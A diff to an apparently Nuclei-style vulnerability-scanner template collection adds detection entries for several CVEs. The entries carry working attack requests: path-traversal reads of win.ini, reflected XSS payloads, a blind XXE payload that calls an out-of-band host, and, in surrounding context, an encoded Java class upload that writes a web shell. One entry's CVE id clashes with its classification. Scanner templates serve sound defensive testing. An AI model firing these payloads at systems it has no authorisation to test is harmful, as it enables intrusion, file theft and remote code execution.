@@ -16226,7 +16226,7 @@
             }
           ],
           "raw": [
-            "GET \\..\\..\\..\\..\\Windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET \\..\\..\\..\\..\\Windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n\n"
           ],
           "unsafe": true
         }
@@ -18342,6 +18342,46 @@
           "path": [
             "{{BaseURL}}/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-7719",
+      "info": {
+        "author": "0x_akoko",
+        "classification": {
+          "cve-id": "CVE-2018-7719",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Acrolinux Server versions prior to 5.2.5 suffer from a directory traversal vulnerability.",
+        "name": "Acrolinx Server Directory Traversal",
+        "reference": [
+          "https://packetstormsecurity.com/files/146911/Acrolinx-Server-Directory-Traversal.html",
+          "https://www.cvedetails.com/cve/CVE-2018-7719"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,acrolinx,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n\n"
+          ],
+          "unsafe": true
         }
       ]
     },
@@ -34968,6 +35008,57 @@
       ]
     },
     {
+      "id": "CVE-2021-27310",
+      "info": {
+        "author": "alph4byt3",
+        "classification": {
+          "cve-id": "CVE-2021-27310",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Clansphere CMS 2011.4 allows unauthenticated reflected XSS via \"language\" parameter.",
+        "name": "Clansphere CMS 2011.4 - Reflected Cross-Site Scripting (XSS)",
+        "reference": [
+          "https://github.com/xoffense/POC/blob/main/Clansphere%202011.4%20%22language%22%20xss.md",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27310"
+        ],
+        "severity": "medium",
+        "tags": "xss,cve,cve2021,clansphere"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/clansphere/mods/clansphere/lang_modvalidate.php?language=language%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&module=module"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-27330",
       "info": {
         "author": "pikpikcu",
@@ -35247,6 +35338,42 @@
           "raw": [
             "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n",
             "GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://example.com HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-27931",
+      "info": {
+        "author": "alph4byt3",
+        "classification": {
+          "cve-id": "CVE-2021-27931",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+          "cvss-score": 9.1,
+          "cwe-id": "CWE-611"
+        },
+        "description": "LumisXP (aka Lumis Experience Platform) before 10.0.0 allows unauthenticated blind XXE via an API request to PageControllerXml.jsp. One can send a request crafted with an XXE payload and achieve outcomes such as reading local server files or denial of service.",
+        "name": "LumisXP Blind XXE",
+        "reference": [
+          "https://github.com/sl4cky/LumisXP-XXE---POC/blob/main/poc.txt",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-27931"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,lumis,xxe,oast"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /lumis/portal/controller/xml/PageControllerXml.jsp HTTP/1.1\nHost: {{Hostname}}\n\n<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY xxe SYSTEM \"http://{{interactsh-url}}\">\n]>\n<method name=\"addPage\">\n<id>&xxe;</id>\n</method>\n"
           ]
         }
       ]
@@ -36231,6 +36358,54 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/../conf/config.properties"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-30213",
+      "info": {
+        "author": "alph4byt3",
+        "classification": {
+          "cve-id": "CVE-2021-30213",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Knowage Suite 7.3 is vulnerable to unauthenticated reflected cross-site scripting (XSS). An attacker can inject arbitrary web script in '/servlet/AdapterHTTP' via the 'targetService' parameter.",
+        "name": "Knowage Suite 7.3 XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-30213",
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,knowage"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/knowage/servlet/AdapterHTTP?Page=LoginPage&NEW_SESSION=TRUE&TargetService=%2Fknowage%2Fservlet%2FAdapterHTTP%3FPage%3DLoginPage%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -38916,6 +39091,57 @@
             "POST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=43992a07d9a30213782780204a9f032b\n\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"methodToCall\"\n\nunspecified\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"Save\"\n\nyes\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"form\"\n\nsmartcard\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"operation\"\n\nAdd\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"Si.class\"\n\n{{hex_decode('CAFEBABE0000003400280D0A000C00160D0A0017001807001908001A08001B08001C08001D08001E0D0A0017001F0700200700210700220100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100083C636C696E69743E01000D0A537461636B4D61705461626C6507002001000D0A536F7572636546696C6501000753692E6A6176610C000D0A000E0700230C002400250100106A6176612F6C616E672F537472696E67010003636D640100022F63010004636F707901000677732E6A737001002A2E2E5C776562617070735C61647373705C68656C705C61646D696E2D67756964655C746573742E6A73700C002600270100136A6176612F696F2F494F457863657074696F6E01000253690100106A6176612F6C616E672F4F626A6563740100116A6176612F6C616E672F52756E74696D6501000D0A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0021000B000C0000000000020001000D0A000E0001000F0000001D00010001000000052AB70001B10000000100100000000600010000000200080011000E0001000F00000064000500020000002BB800024B2A08BD000359031204535904120553590512065359061207535907120853B600094CA700044BB10001000000260029000D0A00020010000000120004000000050004000600260007002A00080012000000070002690700130000010014000000020015')}}\n--43992a07d9a30213782780204a9f032b--\n",
             "POST /./RestAPI/Connection HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmethodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+%22..%5Cbin%22\n",
             "GET /help/admin-guide/test.jsp HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-40542",
+      "info": {
+        "author": "alph4byt3",
+        "classification": {
+          "cve-id": "CVE-2021-38704",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Opensis-Classic Version 8.0 is affected by cross-site scripting (XSS). An unauthenticated user can inject and execute JavaScript code through the link_url parameter in Ajax_url_encode.php.",
+        "name": "Opensis-Classic 8.0 Reflected XSS",
+        "reference": [
+          "https://github.com/OS4ED/openSIS-Classic/issues/189",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-40542"
+        ],
+        "severity": "medium",
+        "tags": "xss,cve,cve2021,opensis"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
